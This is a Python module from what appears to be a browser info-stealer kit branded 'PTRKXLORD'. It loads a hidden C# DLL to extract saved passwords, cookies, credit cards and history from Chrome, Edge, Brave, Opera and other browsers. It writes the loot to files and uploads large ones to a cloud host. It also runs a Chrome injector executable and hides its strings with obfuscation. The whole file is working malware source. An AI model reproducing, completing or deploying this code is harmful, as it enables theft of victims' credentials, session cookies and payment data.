import os
import json
from datetime import datetime
from typing import Dict, List, Any, Optional
import clr
import shutil
from core.obfuscation import decrypt_string
from core.cloud import CloudModule

def log_debug(msg):
    try:
        debug_file = os.path.join(os.environ.get("TEMP", "."), decrypt_string("DF0MNCo0Swg5WxtCDQ=="))
        with open(debug_file, "a", encoding="utf-8") as f:
            f.write(decrypt_string("FVYZHyslMA8/WQRXBRFPB05OWDAMIzYVKRIYdR1dExYLb1gQIyI+HwYZ"))
    except: pass

try:
    log_debug(decrypt_string("PVcZGS05MAw9VwxXABkkCAFFCw48Ai0HOxsPSlxdChY="))
    dll_name = decrypt_string("LEAXHD00KzEuEgtUF0tIHgJe")
    possible_paths = [
        os.path.join(os.path.dirname(__file__), dll_name),
        os.path.join(os.path.dirname(os.path.dirname(__file__)), dll_name),
        os.path.join(os.path.dirname(os.path.dirname(__file__)), "bin", dll_name)
    ]
    
    loaded = False
    for p in possible_paths:
        if os.path.exists(p):
            clr.AddReference(p)
            loaded = True
            break
            
    if loaded:
        from StealthModule import BrowserManager
        CS_STEALER_AVAILABLE = True
    else:
        CS_STEALER_AVAILABLE = False
except Exception:
    CS_STEALER_AVAILABLE = False

class BrowserModule:
    def __init__(self, temp_dir: str):
        self.temp_dir = temp_dir
        local = os.environ.get('LOCALAPPDATA', '')
        roaming = os.environ.get('APPDATA', '')
        
        self.chromium_browsers = {
            'chrome': {'name': 'Google Chrome', 'path': os.path.join(local, decrypt_string('KV0XDCI0BT4ZHxhXH1w6JjtBHRluFTgWOw=='))},
            'edge': {'name': 'Microsoft Edge', 'path': os.path.join(local, decrypt_string('I1sbGSEiNgQuKzZ9Fl4DJjJnCw48cR0DLhY='))},
            'brave': {'name': 'Brave', 'path': os.path.join(local, decrypt_string('LEAZHSsCNgQuAAtKF2U6OBxTDg5jEysNLQQPSi5lMwkLQFgvLyU4'))},
            'opera': {'name': 'Opera', 'path': os.path.join(roaming, decrypt_string('IUIdGS9xCg08Ax1ZAFw6JiFCHRkvcQoWOxUGXQ=='))},
            'opera_gx': {'name': 'Opera GX', 'path': os.path.join(roaming, decrypt_string('IUIdGS9xCg08Ax1ZAFw6JiFCHRkvcR46eiQeWRBVAw=='))},
            'vivaldi': {'name': 'Vivaldi', 'path': os.path.join(local, decrypt_string('OFsOCiI1MD4GIhldABkiGxpT'))},
            'yandex': {'name': 'Yandex', 'path': os.path.join(local, decrypt_string('N1MWDyspBT4DFgRcF0EkCAFFCw48DQU3KRIYGDZYEhs='))},
            'cent': {'name': 'Cent Browser', 'path': os.path.join(local, decrypt_string('LVcWHwwjNhUpEhhkLmwVHxwSPAo6MA=='))},
            'chromium': {'name': 'Chromium', 'path': os.path.join(local, decrypt_string('LVoKBCM4LA8GKz9LF0tGPg9GGQ=='))}
        }

    def steal(self, browser_id: Optional[str] = None) -> Dict[str, Any]:
        """Steals browser data using C# DLL and saves to output/Stealer/"""
        if CS_STEALER_AVAILABLE:
            try:
                # Создаем папку вывода
                stealer_dir = os.path.join("output", "Stealer")
                if not os.path.exists(stealer_dir):
                    os.makedirs(stealer_dir)

                data_json = BrowserManager.StealAll(self.temp_dir)
                data = json.loads(data_json)

                # Сохраняем в файлы
                self._save_data(data, stealer_dir)
                
                return data
            except Exception as e:
                log_debug(decrypt_string("LRFYGDo0OA56EhhKHUtcWhVXBQ=="))

        return {'passwords': [], 'cookies': [], 'profiles_found': 0}

    def _save_data(self, data: Dict[str, Any], out_dir: str):
        """Сохранение и выгрузка если > 50MB"""
        mapping = {
            'passwords': (self.format_passwords, "Passwords.txt"),
            'cookies': (self.format_cookies, "Cookies.txt"),
            'cookies_json': (lambda x: json.dumps(self._convert_cookies_json(x), indent=4, ensure_ascii=False), "Cookies.json"),
            'cards': (lambda x: json.dumps(x, indent=4), "CreditCards.json"),
            'history': (lambda x: json.dumps(x, indent=4), "History.json")
        }

        for key, (formatter, filename) in mapping.items():
            if key in data and data[key]:
                content = formatter(data[key])
                file_path = os.path.join(out_dir, filename)
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(content)
                
                # Проверка размера > 50MB
                if os.path.getsize(file_path) > 50 * 1024 * 1024:
                    link = CloudModule.upload_file(file_path)
                    if link:
                        with open(os.path.join(out_dir, "CloudLinks.txt"), "a") as f:
                            f.write(f"{filename}: {link}\n")

    def format_passwords(self, passwords: List[Dict[str, Any]]) -> str:
        if not passwords: return decrypt_string("IF1YGy8iKhU1BQ5LUl8JDwBWVg==")
        from collections import defaultdict
        grouped = defaultdict(list)
        for p in passwords:
            browser = p.get('Browser') or p.get('browser', 'Unknown')
            grouped[browser].append(p)

        ascii_art = """
 █████╗ ███████╗███████╗██████╗  █████╗ ██████╗  ██████╗ ██╗  ██╗██╗████████╗ █████╗ ██╗   ██╗███████╗██╗  ██╗██╗
██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔═══██╗██║ ██╔╝██║╚══██╔══╝██╔══██╗╚██╗ ██╔╝██╔════╝██║ ██╔╝██║
███████║█████╗  █████╗  ██████╔╝███████║██████╔╝██║   ██║█████╔╝ ██║   ██║   ███████║ ╚████╔╝ ███████╗█████╔╝ ██║
██╔══██║██╔══╝  ██╔══╝  ██╔══██╗██╔══██║██╔═══╝ ██║   ██║██╔═██╗ ██║   ██║   ██╔══██║  ╚██╔╝  ╚════██║██╔═██╗ ██║
██║  ██║██║     ███████╗██║  ██║██║  ██║██║     ╚██████╔╝██║  ██╗██║   ██║   ██║  ██║   ██║   ███████║██║  ██╗██║
╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝
"""
        lines = [ascii_art, "═══ 🔑 PTRKXLORD PASSWORDS 🔑 ═══", ""]
        for b_name, p_list in grouped.items():
            lines.append(decrypt_string("NUkaNCAwNAd0AhpIF0tOUxNv"))
            for p in p_list:
                url = p.get('Url') or p.get('url', 'n/a')
                user = p.get('Username') or p.get('user', 'n/a')
                pw = p.get('Password') or p.get('pass', 'n/a')
                lines.append(f"🌐 {url} | 👤 {user} | 🔑 {pw}")
            lines.append("")
        lines.append("═" * 40)
        return "\n".join(lines)

    def format_cookies(self, cookies: List[Dict[str, Any]]) -> str:
        if not cookies: return ""
        lines = []
        for c in cookies:
            host = c.get('Host') or c.get('host', 'unknown')
            path = c.get('Path') or c.get('path', '/')
            name = c.get('Name') or c.get('name', 'unknown')
            value = c.get('Value') or c.get('value', '')
            secure = c.get('Secure') if 'Secure' in c else c.get('is_secure', False)
            expires = c.get('Expires', 0)
            
            if expires > 1000000000000000: 
                expires = (expires / 1000000) - 11644473600
            
            clean_value = str(value).replace('\t', ' ').replace('\r', '').replace('\n', ' ')
            lines.append(f"{host}\tTRUE\t{path}\t{str(secure).upper()}\t{int(expires)}\t{name}\t{clean_value}")
        return "\n".join(lines)

    def _convert_cookies_json(self, cookies: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        converted = []
        for c in cookies:
            expires = c.get('Expires') or c.get('expires', 0)
            # Windows Filetime (microseconds) to Unix timestamp (seconds)
            if expires > 1000000000000000:
                expires = int((int(expires) - 11644473600000000) // 1000000)
            
            converted.append({
                "domain": c.get('Host') or c.get('host', ''),
                "name": c.get('Name') or c.get('name', ''),
                "path": c.get('Path') or c.get('path', '/'),
                "secure": bool(c.get('Secure') if 'Secure' in c else c.get('is_secure', False)),
                "httpOnly": bool(c.get('HttpOnly') if 'HttpOnly' in c else c.get('is_httponly', False)),
                "expirationDate": int(expires),
                "value": c.get('Value') or c.get('value', ''),
            })
        return converted

class ChromeInjector:
    def __init__(self):
        self.base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        self.arch = os.environ.get('PROCESSOR_ARCHITECTURE', 'AMD64').lower()
        preferred = decrypt_string("DVoKBCM0NQcsFh5XAGYeTFocHRMr") # chromelevator_x64.exe
        fallback = decrypt_string("DVoKBCM0NQcsFh5XAGYHCAMETEUrKTw=") # chromelevator_arm64.exe
        
        possible_names = [
            os.path.join(self.base_dir, "core", preferred),
            os.path.join(self.base_dir, "bin", preferred),
            os.path.join(self.base_dir, "core", fallback),
            os.path.join(self.base_dir, "bin", fallback),
            os.path.join(self.base_dir, preferred),
        ]
        self.injector_path = None
        for name in possible_names:
            if os.path.exists(name):
                self.injector_path = str(name)
                break

    def is_available(self):
        return self.injector_path is not None and CS_STEALER_AVAILABLE

    def run_injector_safe(self, action="all", timeout=30, cwd=None):
        if not self.is_available(): return "❌ Injector or DLL not available"
        try:
            return BrowserManager.RunInjector(self.injector_path, action, timeout * 1000)
        except Exception as e:
            return decrypt_string("jK/0Swc/Mwc5AwVKUlwUCAFAQks1NCQ=")

    def run_injector(self, action="all", timeout=30, cwd=None, pid=None, method=None):
        return self.run_injector_safe(action, timeout, cwd)

if __name__ == "__main__":
    try:
        from tempfile import TemporaryDirectory
        with TemporaryDirectory() as tmp:
            bm = BrowserModule(tmp)
            data = bm.steal()
            print(decrypt_string("KF0NBSpxIg4/GUJcE00HVAlXDENpITgRKQAFShZKQVZOaSVCZyx5EjsEGU8dSwIJQA=="))
    except Exception as e:
        print(decrypt_string("K0AKBDxreRk/Cg=="))